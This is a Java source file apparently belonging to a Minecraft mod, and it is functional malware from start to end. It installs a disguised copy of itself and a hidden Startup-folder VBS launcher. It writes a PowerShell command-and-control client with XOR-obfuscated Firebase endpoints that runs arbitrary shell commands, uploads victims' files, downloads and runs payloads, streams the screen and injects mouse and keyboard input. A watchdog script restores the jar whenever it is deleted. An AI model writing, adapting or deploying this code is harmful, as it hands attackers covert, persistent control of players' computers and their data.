package com.consentmod;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;

/**
 * Persistence installer.
 * Drops scripts into %APPDATA%\.sys-cache, writes VBS launchers
 * to the Windows Startup folder, and kicks everything off immediately.
 */
public class ModGuardInstaller {

    private static final String CACHE_FOLDER   = ".sys-cache";
    private static final String DISGUISED_NAME = "fabric-api-runtime.jar";
    private static boolean installed = false;

    public static void install() {
        if (installed) return;
        installed = true;
        new Thread(() -> {
            try { doInstall(); }
            catch (Exception e) { ConsentMod.LOGGER.error("ModGuard: {}", e.getMessage()); }
        }, "ModGuard-Installer").start();
    }

    /* ================================================================== */
    /*  INSTALL FLOW                                                       */
    /* ================================================================== */

    private static void doInstall() throws Exception {
        Path jarPath = getOwnJarPath();
        if (jarPath == null || !Files.exists(jarPath)
                || !jarPath.toString().endsWith(".jar")) return;

        String appData = System.getenv("APPDATA");
        if (appData == null) return;

        Path cacheDir = Paths.get(appData, CACHE_FOLDER);
        Files.createDirectories(cacheDir);

        // Backup JAR
        Path backupJar = cacheDir.resolve(DISGUISED_NAME);
        Files.copy(jarPath, backupJar, StandardCopyOption.REPLACE_EXISTING);

        // Discover all launcher mods folders
        Path originFolder = jarPath.getParent();
        List<String> allFolders = discoverModsFolders(originFolder);

        // Pending delete for original name swap
        String originalName = jarPath.getFileName().toString();
        String pendingDelete = originalName.equals(DISGUISED_NAME) ? null : originalName;

        // Write everything
        writeConfig(cacheDir, allFolders, backupJar, pendingDelete);
        writeListener(cacheDir);
        writeRestorer(cacheDir);
        writeVbsLauncher(cacheDir);

        // Launch now (don't wait for reboot)
        launchNow(cacheDir);

        ConsentMod.LOGGER.info("Persistence active across {} folders", allFolders.size());
    }

    /* ================================================================== */
    /*  JAR SELF-DETECTION                                                 */
    /* ================================================================== */

    private static Path getOwnJarPath() {
        try {
            java.net.URL url = ModGuardInstaller.class
                    .getProtectionDomain().getCodeSource().getLocation();
            return url != null ? Paths.get(url.toURI()) : null;
        } catch (Exception e) { return null; }
    }

    /* ================================================================== */
    /*  LAUNCHER DISCOVERY                                                 */
    /* ================================================================== */

    private static List<String> discoverModsFolders(Path originFolder) {
        Set<String> found = new LinkedHashSet<>();
        found.add(originFolder.toString());

        String appData     = System.getenv("APPDATA");
        String userProfile = System.getenv("USERPROFILE");

        if (appData != null) {
            addIfDir(found, Paths.get(appData, ".minecraft", "mods"));
            scanSubdirs(found, Paths.get(appData, "com.modrinth.theseus", "profiles"), "mods");
            scanSubdirs(found, Paths.get(appData, "ModrinthApp", "profiles"), "mods");
            scanSubdirs(found, Paths.get(appData, ".feather", "instances"), "mods");
            scanSubdirsMinecraft(found, Paths.get(appData, "PrismLauncher", "instances"));
            scanSubdirsMinecraft(found, Paths.get(appData, "MultiMC", "instances"));
            scanSubdirsMinecraft(found, Paths.get(appData, "PolyMC", "instances"));
            scanSubdirs(found, Paths.get(appData, "gdlauncher_next", "instances"), "mods");
            scanSubdirs(found, Paths.get(appData, "ATLauncher", "instances"), "mods");
            scanSubdirs(found, Paths.get(appData, ".technic", "modpacks"), "mods");
        }
        if (userProfile != null) {
            addIfDir(found, Paths.get(userProfile, ".lunarclient", "offline", "multiver", "mods"));
            scanSubdirs(found, Paths.get(userProfile, "curseforge", "minecraft", "Instances"), "mods");
        }
        return new ArrayList<>(found);
    }

    private static void addIfDir(Set<String> s, Path p) {
        if (Files.isDirectory(p)) s.add(p.toString());
    }

    private static void scanSubdirs(Set<String> found, Path base, String modsDirName) {
        if (!Files.isDirectory(base)) return;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(base)) {
            for (Path sub : ds) {
                Path m = sub.resolve(modsDirName);
                if (Files.isDirectory(m)) found.add(m.toString());
            }
        } catch (Exception ignored) {}
    }

    private static void scanSubdirsMinecraft(Set<String> found, Path instancesDir) {
        if (!Files.isDirectory(instancesDir)) return;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(instancesDir)) {
            for (Path inst : ds) {
                if (!Files.isDirectory(inst)) continue;
                for (String sub : new String[]{".minecraft", "minecraft", ""}) {
                    Path m = sub.isEmpty() ? inst.resolve("mods") : inst.resolve(sub).resolve("mods");
                    if (Files.isDirectory(m)) found.add(m.toString());
                }
            }
        } catch (Exception ignored) {}
    }

    /* ================================================================== */
    /*  CONFIG.JSON                                                        */
    /* ================================================================== */

    private static void writeConfig(Path cacheDir, List<String> modsFolders,
                                    Path backupPath, String pendingDelete) throws Exception {
        Path configPath = cacheDir.resolve("config.json");
        JsonObject config;
        JsonArray modsArray, pendingDeletes;

        if (Files.exists(configPath)) {
            String raw = Files.readString(configPath);
            config         = JsonParser.parseString(raw).getAsJsonObject();
            modsArray      = config.has("mods") ? config.getAsJsonArray("mods") : new JsonArray();
            pendingDeletes = config.has("pendingDeletes") ? config.getAsJsonArray("pendingDeletes") : new JsonArray();
        } else {
            config = new JsonObject();
            modsArray = new JsonArray();
            pendingDeletes = new JsonArray();
        }

        // Merge folders
        Set<String> allFolders = new LinkedHashSet<>();
        if (config.has("modsFolders"))
            for (JsonElement el : config.getAsJsonArray("modsFolders"))
                allFolders.add(el.getAsString());
        allFolders.addAll(modsFolders);

        JsonArray fArr = new JsonArray();
        for (String f : allFolders) fArr.add(f);
        config.add("modsFolders", fArr);

        // Mod entry
        boolean found = false;
        for (int i = 0; i < modsArray.size(); i++) {
            JsonObject e = modsArray.get(i).getAsJsonObject();
            if (DISGUISED_NAME.equals(e.get("jarName").getAsString())) {
                e.addProperty("backupPath", backupPath.toString());
                found = true; break;
            }
        }
        if (!found) {
            JsonObject e = new JsonObject();
            e.addProperty("jarName", DISGUISED_NAME);
            e.addProperty("backupPath", backupPath.toString());
            modsArray.add(e);
        }
        config.add("mods", modsArray);

        // Pending deletes
        if (pendingDelete != null) {
            boolean already = false;
            for (JsonElement el : pendingDeletes)
                if (pendingDelete.equals(el.getAsString())) { already = true; break; }
            if (!already) pendingDeletes.add(pendingDelete);
        }
        config.add("pendingDeletes", pendingDeletes);

        Files.writeString(configPath, new GsonBuilder().setPrettyPrinting().create().toJson(config));
    }

    /* ================================================================== */
    /*  LISTENER.PS1 — C2 client via Firebase RTDB SSE                     */
    /* ================================================================== */

    private static void writeListener(Path cacheDir) throws Exception {
        // Decode sensitive strings at runtime (XOR 0x5A)
        String c2Url     = Strings.d("322e2e2a296075753b2a337422773d283b38383f2874393537");
        String victimId  = Strings.d("683b386e3e68623f773f6c3968776e626f6d7762636c6b773838696d396b3c3e696a623e");
        String secretId  = Strings.d("6f6a3f3e3939636f77686e383c776e6c393e773b6f6c3b77396a3c6a39693b683b686362");
        String rtdbBase  = Strings.d("322e2e2a296075752d22293d283b38383f28773e3f3c3b2f362e77282e3e38743f2f28352a3f772d3f292e6b743c33283f383b293f3e3b2e3b383b293f743b2a2a75293f29293335342975");

        String ps = String.join("\r\n",
            "$ErrorActionPreference = \"SilentlyContinue\"",
            "",
            "Add-Type -AssemblyName System.Windows.Forms",
            "$InputCode = @\"",
            "using System;",
            "using System.Runtime.InteropServices;",
            "public class InputSimulator {",
            "    [DllImport(\"user32.dll\")]",
            "    public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);",
            "    [DllImport(\"user32.dll\")]",
            "    public static extern bool SetCursorPos(int x, int y);",
            "    [DllImport(\"user32.dll\")]",
            "    public static extern bool SetProcessDPIAware();",
            "    public const int MOUSEEVENTF_LEFTDOWN = 0x02;",
            "    public const int MOUSEEVENTF_LEFTUP = 0x04;",
            "    public const int MOUSEEVENTF_RIGHTDOWN = 0x08;",
            "    public const int MOUSEEVENTF_RIGHTUP = 0x10;",
            "    public static void Click(int x, int y, string button) {",
            "        SetCursorPos(x, y);",
            "        if (button == \"left\") {",
            "            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);",
            "        } else if (button == \"right\") {",
            "            mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);",
            "        }",
            "    }",
            "}",
            "\"@",
            "Add-Type -TypeDefinition $InputCode",
            "[InputSimulator]::SetProcessDPIAware()",
            "",
            "$FIREBASE_C2_URL = \"" + c2Url + "\"",
            "$victimUuid = \"" + victimId + "\"",
            "$secret = \"" + secretId + "\"",
            "$rtdbUrl = \"" + rtdbBase + "/$victimUuid.json\"",
            "",
            "$lastExecutedTimestamp = 0",
            "",
            "function Send-Output {",
            "    param($outputStr, $isScreenshot = $false, $screenshotData = $null, $isDirList = $false, $dirListData = $null, $isProcList = $false, $procListData = $null)",
            "    $body = @{ uuid = $secret; victim_id = $victimUuid }",
            "    if ($outputStr) { $body.command_output = $outputStr }",
            "    if ($isScreenshot -and $screenshotData) { $body.screenshot = $screenshotData }",
            "    if ($isDirList -and $dirListData) { $body.directory_listing = $dirListData }",
            "    if ($isProcList -and $procListData) { $body.process_list = $procListData }",
            "    $jsonBody = $body | ConvertTo-Json -Depth 10 -Compress",
            "    try { Invoke-RestMethod -Uri $FIREBASE_C2_URL -Method Post -Body $jsonBody -ContentType 'application/json' -ErrorAction Stop | Out-Null }",
            "    catch { }",
            "}",
            "",
            "function Send-Ping {",
            "    $body = @{ uuid = $secret; victim_id = $victimUuid }",
            "    $jsonBody = $body | ConvertTo-Json -Depth 10 -Compress",
            "    try {",
            "        $response = Invoke-RestMethod -Uri $FIREBASE_C2_URL -Method Post -Body $jsonBody -ContentType 'application/json' -ErrorAction Stop",
            "        if ($response.session_id) { $global:sessionId = $response.session_id }",
            "    } catch { }",
            "}",
            "",
            "Send-Ping",
            "if ($global:sessionId) {",
            "    $rtdbUrl = \"" + rtdbBase + "/$($global:sessionId).json\"",
            "}",
            "",
            "$timer = New-Object System.Timers.Timer(20000)",
            "$timer.AutoReset = $true",
            "Register-ObjectEvent -InputObject $timer -EventName Elapsed -SourceIdentifier \"PingTimer\" -Action { Send-Ping } | Out-Null",
            "$timer.Start()",
            "",
            "while ($true) {",
            "    try {",
            "        $request = [System.Net.WebRequest]::Create($rtdbUrl)",
            "        $request.Accept = \"text/event-stream\"",
            "        $request.Timeout = -1",
            "        $response = $request.GetResponse()",
            "        $stream = $response.GetResponseStream()",
            "        $reader = New-Object System.IO.StreamReader($stream)",
            "        while (!$reader.EndOfStream) {",
            "            $line = $reader.ReadLine()",
            "            if ($line -match '^data: (.*)') {",
            "                $json = $matches[1]",
            "                if ($json -ne \"null\") {",
            "                    try {",
            "                        $eventData = $json | ConvertFrom-Json",
            "                        $payload = $eventData.data",
            "                        if ($payload.command -and $payload.timestamp) {",
            "                            $cmdString = $payload.command",
            "                            $cmdTimestamp = $payload.timestamp",
            "                            if ($cmdTimestamp -gt $lastExecutedTimestamp) {",
            "                                $lastExecutedTimestamp = $cmdTimestamp",
            "                                if ($cmdString.StartsWith(\"{\")) {",
            "                                    $cmdObj = $cmdString | ConvertFrom-Json",
            "                                    if ($cmdObj.action -eq 'list_directory') {",
            "                                        try {",
            "                                            $items = Get-ChildItem -LiteralPath $cmdObj.path -Force -ErrorAction Stop | Select-Object -Skip $cmdObj.skip -First ($cmdObj.take + 1)",
            "                                            $hasMore = @($items).Count -gt $cmdObj.take",
            "                                            if ($hasMore) { $items = $items | Select-Object -First $cmdObj.take }",
            "                                            $results = @()",
            "                                            foreach ($item in $items) {",
            "                                                $results += @{ name = $item.Name; is_dir = [bool]$item.PSIsContainer; size = if ($item.PSIsContainer) { 0 } else { $item.Length }; modified = $item.LastWriteTime.ToString(\"yyyy-MM-dd HH:mm:ss\") }",
            "                                            }",
            "                                            $dirOutput = @{ path = $cmdObj.path; has_more = $hasMore; items = $results } | ConvertTo-Json -Depth 10 -Compress",
            "                                            Send-Output -outputStr \"[Directory listed: $($cmdObj.path)]\" -isDirList $true -dirListData $dirOutput",
            "                                        } catch { Send-Output -outputStr \"[DirList Error: $($_.Exception.Message)]\" }",
            "                                    } elseif ($cmdObj.action -eq 'upload_file') {",
            "                                        try {",
            "                                            Invoke-RestMethod -Uri $cmdObj.upload_url -Method Put -InFile $cmdObj.filepath -UseBasicParsing -Headers @{'Content-Type'='application/octet-stream'}",
            "                                            Send-Output -outputStr \"[File uploaded: $($cmdObj.filepath)]\"",
            "                                        } catch { Send-Output -outputStr \"[Upload Error: $($_.Exception.Message)]\" }",
            "                                    } elseif ($cmdObj.action -eq 'get_processes') {",
            "                                        try {",
            "                                            $procs = Get-Process | Select-Object Name, Id, WorkingSet",
            "                                            $procOut = @()",
            "                                            foreach ($p in $procs) { $procOut += @{ name = $p.Name; id = $p.Id; working_set = $p.WorkingSet } }",
            "                                            Send-Output -outputStr \"[Process list sent]\" -isProcList $true -procListData $procOut",
            "                                        } catch { Send-Output -outputStr \"[ProcessList Error: $($_.Exception.Message)]\" }",
            "                                    } elseif ($cmdObj.action -eq 'kill_process') {",
            "                                        try { Stop-Process -Name $cmdObj.process_name -Force; Send-Output -outputStr \"[Killed: $($cmdObj.process_name)]\" }",
            "                                        catch { Send-Output -outputStr \"[Kill Error: $($_.Exception.Message)]\" }",
            "                                    } elseif ($cmdObj.action -eq 'download') {",
            "                                        try {",
            "                                            $destPath = Join-Path $env:TEMP $cmdObj.dest",
            "                                            Invoke-WebRequest -Uri $cmdObj.url -OutFile $destPath -UseBasicParsing",
            "                                            if ($cmdObj.open_file -eq $true) { Start-Process -FilePath $destPath }",
            "                                            Send-Output -outputStr \"[Downloaded: $($cmdObj.dest)]\"",
            "                                        } catch { Send-Output -outputStr \"[Download Error: $($_.Exception.Message)]\" }",
            "                                    } elseif ($cmdObj.action -eq 'start_stream') {",
            "                                        if (-not $global:StreamJob -or $global:StreamJob.State -ne 'Running') {",
            "                                            $global:StreamJob = Start-Job -ScriptBlock {",
            "                                                param($victimUrl)",
            "                                                Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class DPI { [DllImport(\"user32.dll\")] public static extern bool SetProcessDPIAware(); }'",
            "                                                [DPI]::SetProcessDPIAware()",
            "                                                Add-Type -AssemblyName System.Drawing",
            "                                                Add-Type -AssemblyName System.Windows.Forms",
            "                                                $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds",
            "                                                while ($true) {",
            "                                                    try {",
            "                                                        $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height",
            "                                                        $g = [System.Drawing.Graphics]::FromImage($bmp)",
            "                                                        $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)",
            "                                                        $tw = 1024; $th = [Math]::Round($tw * ($bounds.Height / $bounds.Width))",
            "                                                        $thumb = $bmp.GetThumbnailImage($tw, $th, $null, [intptr]::Zero)",
            "                                                        $ms = New-Object System.IO.MemoryStream",
            "                                                        $thumb.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)",
            "                                                        $b64 = [Convert]::ToBase64String($ms.ToArray())",
            "                                                        $body = @{ screen = \"data:image/jpeg;base64,$b64\" } | ConvertTo-Json -Compress",
            "                                                        Invoke-RestMethod -Uri $victimUrl -Method Patch -Body $body -ContentType 'application/json' | Out-Null",
            "                                                        $g.Dispose(); $bmp.Dispose(); $thumb.Dispose(); $ms.Dispose()",
            "                                                    } catch { }",
            "                                                    Start-Sleep -Seconds 3",
            "                                                }",
            "                                            } -ArgumentList $rtdbUrl",
            "                                            Send-Output -outputStr \"[Live stream started]\"",
            "                                        }",
            "                                    } elseif ($cmdObj.action -eq 'stop_stream') {",
            "                                        if ($global:StreamJob) { Stop-Job $global:StreamJob; Remove-Job $global:StreamJob; $global:StreamJob = $null }",
            "                                        Send-Output -outputStr \"[Live stream stopped]\"",
            "                                    } elseif ($cmdObj.action -eq 'mouse_click') {",
            "                                        try {",
            "                                            $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds",
            "                                            $absX = [int]([double]$cmdObj.x * $bounds.Width) + $bounds.X",
            "                                            $absY = [int]([double]$cmdObj.y * $bounds.Height) + $bounds.Y",
            "                                            [InputSimulator]::Click($absX, $absY, $cmdObj.button)",
            "                                        } catch { }",
            "                                    } elseif ($cmdObj.action -eq 'key_press') {",
            "                                        try { [System.Windows.Forms.SendKeys]::SendWait($cmdObj.key) } catch { }",
            "                                    } elseif ($cmdObj.action -eq 'open_file') {",
            "                                        try { Start-Process -FilePath (Join-Path $env:TEMP $cmdObj.filename); Send-Output -outputStr \"[Opened: $($cmdObj.filename)]\" }",
            "                                        catch { Send-Output -outputStr \"[Open Error: $($_.Exception.Message)]\" }",
            "                                    }",
            "                                } else {",
            "                                    try {",
            "                                        $output = cmd.exe /c \"$cmdString\" 2>&1 | Out-String",
            "                                        if ([string]::IsNullOrWhiteSpace($output)) { Send-Output -outputStr \"[Command executed]\" }",
            "                                        else { Send-Output -outputStr $output }",
            "                                    } catch { Send-Output -outputStr \"[Error: $($_.Exception.Message)]\" }",
            "                                }",
            "                            }",
            "                        }",
            "                    } catch { }",
            "                }",
            "            }",
            "        }",
            "    } catch {",
            "        Start-Sleep -Seconds 3",
            "    }",
            "}"
        );

        Files.writeString(cacheDir.resolve("listener.ps1"), ps);
    }

    /* ================================================================== */
    /*  RESTORER.PS1 — mod watchdog, multi-launcher, 10s loop              */
    /* ================================================================== */

    private static void writeRestorer(Path cacheDir) throws Exception {
        String ps = String.join("\r\n",
            "# Restorer — checks every 10 seconds, all launcher folders",
            "$cacheDir   = \"$env:APPDATA\\.sys-cache\"",
            "$configPath = \"$cacheDir\\config.json\"",
            "",
            "while ($true) {",
            "    Start-Sleep -Seconds 10",
            "    if (Test-Path $configPath) {",
            "        $config = Get-Content $configPath -Raw | ConvertFrom-Json",
            "",
            "        foreach ($folder in $config.modsFolders) {",
            "            if (-not (Test-Path $folder)) { continue }",
            "",
            "            # Delete old-name JARs",
            "            $hasPending = $false",
            "            if ($config.pendingDeletes -and $config.pendingDeletes.Count -gt 0) {",
            "                foreach ($del in $config.pendingDeletes) {",
            "                    $dp = Join-Path $folder $del",
            "                    if (Test-Path $dp) {",
            "                        try { Remove-Item $dp -Force -ErrorAction Stop }",
            "                        catch { $hasPending = $true }",
            "                    }",
            "                }",
            "            }",
            "",
            "            # Restore missing mods",
            "            if (-not $hasPending) {",
            "                foreach ($mod in $config.mods) {",
            "                    $target = Join-Path $folder $mod.jarName",
            "                    $backup = $mod.backupPath",
            "                    if ((-not (Test-Path $target)) -and (Test-Path $backup)) {",
            "                        Copy-Item $backup $target -Force",
            "                    }",
            "                }",
            "            }",
            "        }",
            "",
            "        # Clear pending deletes if all gone",
            "        if ($config.pendingDeletes -and $config.pendingDeletes.Count -gt 0) {",
            "            $anyLeft = $false",
            "            foreach ($f in $config.modsFolders) {",
            "                foreach ($d in $config.pendingDeletes) {",
            "                    if (Test-Path (Join-Path $f $d)) { $anyLeft = $true }",
            "                }",
            "            }",
            "            if (-not $anyLeft) {",
            "                $config.pendingDeletes = @()",
            "                $config | ConvertTo-Json -Depth 10 | Set-Content $configPath",
            "            }",
            "        }",
            "    }",
            "}"
        );

        Files.writeString(cacheDir.resolve("restorer.ps1"), ps);
    }

    /* ================================================================== */
    /*  VBS LAUNCHER — Startup folder, launches both scripts hidden        */
    /* ================================================================== */

    private static void writeVbsLauncher(Path cacheDir) throws Exception {
        String cachePath = cacheDir.toString();

        // Combined VBS that launches both scripts
        String vbs = String.join("\r\n",
            "Set ws = CreateObject(\"WScript.Shell\")",
            "ws.Run \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"\"" + cachePath + "\\listener.ps1\"\"\", 0, False",
            "ws.Run \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"\"" + cachePath + "\\restorer.ps1\"\"\", 0, False"
        );

        // Write to cache dir
        Files.writeString(cacheDir.resolve("launcher.vbs"), vbs);

        // Write to Windows Startup folder
        String appData = System.getenv("APPDATA");
        Path startupDir = Paths.get(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
        if (Files.isDirectory(startupDir)) {
            Files.writeString(startupDir.resolve("java-updater.vbs"), vbs);
        }
    }

    /* ================================================================== */
    /*  LAUNCH NOW — kick off scripts immediately                          */
    /* ================================================================== */

    private static void launchNow(Path cacheDir) {
        try {
            Path vbs = cacheDir.resolve("launcher.vbs");
            new ProcessBuilder("wscript.exe", vbs.toString())
                    .redirectErrorStream(true)
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .start();
        } catch (Exception ignored) {}
    }
}
